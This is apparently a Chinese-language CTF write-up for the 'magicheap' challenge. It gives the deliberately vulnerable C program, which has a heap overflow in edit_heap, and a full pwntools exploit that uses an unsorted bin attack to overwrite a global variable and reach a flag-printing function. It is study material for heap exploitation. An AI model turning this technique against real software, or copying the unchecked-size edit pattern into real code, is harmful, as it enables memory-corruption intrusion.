---
layout: post
title: magicheap unsortbin attack
excerpt: "unsortbin attack"
categories: [Writeup]
comments: true
---
首先查看下代码
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void read_input(char *buf,size_t size){		//读取屏幕输入的size字节,到buf中
	int ret ;
    ret = read(0,buf,size);
    if(ret <=0){
        puts("Error");
        _exit(-1);
    }	
}

char *heaparray[10];
unsigned long int magic = 0 ;

void menu(){									//这个就是menu
	puts("--------------------------------");
	puts("       Magic Heap Creator       ");
	puts("--------------------------------");
	puts(" 1. Create a Heap               ");
	puts(" 2. Edit a Heap                 ");
	puts(" 3. Delete a Heap               ");
	puts(" 4. Exit                        ");
	puts("--------------------------------");
	printf("Your choice :");
}

void create_heap(){
	int i ;
	char buf[8];
	size_t size = 0;
	for(i = 0 ; i < 10 ; i++){
		if(!heaparray[i]){					//遍历找到没有使用的heap指针
			printf("Size of Heap : ");
			read(0,buf,8);						
			size = atoi(buf);
			heaparray[i] = (char *)malloc(size);	//输入数字并申请相应的堆块
			if(!heaparray[i]){
				puts("Allocate Error");
				exit(2);
			}
			printf("Content of heap:");
			read_input(heaparray[i],size);		//读取屏幕输入到堆块中
			puts("SuccessFul");
			break ;
		}
	}
}

void edit_heap(){
	int idx ;
	char buf[4];
	size_t size ;
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		printf("Size of Heap : ");
		read(0,buf,8);
		size = atoi(buf);
		printf("Content of heap : ");
		read_input(heaparray[idx] ,size);	//这里存在一个堆溢出,我们可以根据这个溢出覆盖bk,制造unsortbin attack,修改变量内容
		puts("Done !");
	}else{
		puts("No such heap !");
	}
}


void delete_heap(){
	int idx ;
	char buf[4];
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= 10){
		puts("Out of bound!");
		_exit(0);
	}
	if(heaparray[idx]){
		free(heaparray[idx]);			//free结构体并置零
		heaparray[idx] = NULL ;
		puts("Done !");	
	}else{
		puts("No such heap !");
	}

}


void l33t(){							// 运行到这里就成功了
	system("cat /home/magicheap/flag");
}

int main(){
	char buf[8];
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	while(1){
		menu();
		read(0,buf,8);
		switch(atoi(buf)){
			case 1 :
				create_heap();
				break ;
			case 2 :
				edit_heap();
				break ;
			case 3 :
				delete_heap();
				break ;
			case 4 :
				exit(0);
				break ;
			case 4869 :
				if(magic > 4869){				//我们只要控制magic的值,就可以了
					puts("Congrt !");
					l33t();
				}else
					puts("So sad !");
				break ;
			default :
				puts("Invalid Choice");
				break;
		}

	}
	return 0 ;
}
```

最终的exp如下
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./magicheap')

def create_heap(size,content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def edit_heap(idx,size,content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def del_heap(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

create_heap(0x80,"dada") # 0
create_heap(0x20,"dada") # 1		这个用来覆盖下一个
create_heap(0x80,"dada") # 2
create_heap(0x20,"dada") # 3

del_heap(2)
del_heap(0)
magic = 0x6020c0
fd = 0
bk = magic - 0x10

edit_heap(1,0x20+0x20,"a"*0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))	# 堆溢出,覆盖下一个chunk
create_heap(0x80,"dada") #触发unsorted bin attack,使其从unsortbin中剔除,然后改变下面的fd,bk
r.recvuntil(":")
r.sendline("4869")
r.interactive()
```
